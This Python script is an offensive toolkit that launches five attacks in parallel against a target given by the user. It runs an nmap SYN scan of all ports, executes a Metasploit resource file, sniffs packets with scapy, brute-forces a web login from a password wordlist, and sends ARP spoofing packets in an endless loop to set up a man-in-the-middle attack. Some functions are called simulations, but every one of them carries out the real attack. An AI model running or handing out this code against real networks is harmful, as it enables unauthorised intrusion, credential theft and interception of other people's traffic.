import os
import socket
import time
import requests
import threading
import paramiko
import subprocess
import scapy.all as scapy

# Function for Network Scanning
def network_scan(target_ip):
    print(f"[+] Scanning network for active hosts and open ports on {target_ip}")
    os.system(f"nmap -sS -p- -T4 {target_ip}")  # TCP SYN Scan on all ports
    print("[+] Network scan completed")

# Function for Exploit Simulation
def exploit_simulation(target_ip, exploit_file):
    print(f"[+] Attempting exploit on {target_ip} using {exploit_file}")
    if not os.path.exists(exploit_file):
        print(f"[!] Exploit file '{exploit_file}' not found!")
        return
    exploit_cmd = f"msfconsole -q -r {exploit_file}"
    os.system(exploit_cmd)
    print("[+] Exploit attempt completed")

# Function for Packet Sniffing
def packet_sniffing(interface, output_file):
    print(f"[+] Starting packet sniffing on {interface}, saving to {output_file}")
    packets = scapy.sniff(iface=interface, count=100, prn=lambda x: x.summary())  # Capture 100 packets
    scapy.wrpcap(output_file, packets)  # Save packets
    print(f"[+] Packet sniffing completed, saved to {output_file}")

# Function for Web Application Brute-Force Attack
def web_brute_force(target_url, username, wordlist_file):
    print(f"[+] Initiating brute-force attack on {target_url} using {wordlist_file}")
    if not os.path.exists(wordlist_file):
        print(f"[!] Wordlist file '{wordlist_file}' not found!")
        return

    with open(wordlist_file, "r") as f:
        common_passwords = f.read().splitlines()

    for pwd in common_passwords:
        data = {"username": username, "password": pwd}
        response = requests.post(target_url, data=data)
        if "Invalid password" not in response.text:
            print(f"[+] Login successful with {username}:{pwd}")
            break
    print("[+] Brute-force attack simulation completed")

# Function for Man-in-the-Middle Attack (MITM)
def mitm_attack(target_ip, gateway_ip):
    print(f"[+] Initiating Man-in-the-Middle Attack on {target_ip}")
    spoof_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=scapy.getmacbyip(target_ip), psrc=gateway_ip)
    while True:
        scapy.send(spoof_packet, verbose=False)
        time.sleep(2)
    print("[+] ARP Spoofing attack completed")

# Main Execution Flow
if __name__ == "__main__":
    # User Inputs
    target_ip = input("Enter the target IP address: ")
    gateway_ip = input("Enter the gateway IP (for MITM attack): ")
    network_interface = input("Enter the network interface (e.g., eth0, wlan0): ")
    web_target = input("Enter the target web application URL (for brute-force testing): ")
    username = input("Enter the username for brute-force attack: ")
    
    # File Inputs
    exploit_file = input("Enter the path to your Metasploit exploit script (.rc file): ")
    packet_output = input("Enter the path to save packet capture (e.g., capture.pcap): ")
    wordlist_file = input("Enter the path to your password wordlist file (e.g., rockyou.txt): ")

    # Validate if files exist before execution
    if not os.path.exists(exploit_file):
        print(f"[!] Warning: Exploit file '{exploit_file}' not found! Skipping exploit simulation.")

    if not os.path.exists(wordlist_file):
        print(f"[!] Warning: Wordlist file '{wordlist_file}' not found! Skipping brute-force attack.")

    # Running Attacks in Parallel
    threading.Thread(target=network_scan, args=(target_ip,)).start()
    threading.Thread(target=exploit_simulation, args=(target_ip, exploit_file)).start()
    threading.Thread(target=packet_sniffing, args=(network_interface, packet_output)).start()
    threading.Thread(target=web_brute_force, args=(web_target, username, wordlist_file)).start()
    threading.Thread(target=mitm_attack, args=(target_ip, gateway_ip)).start()
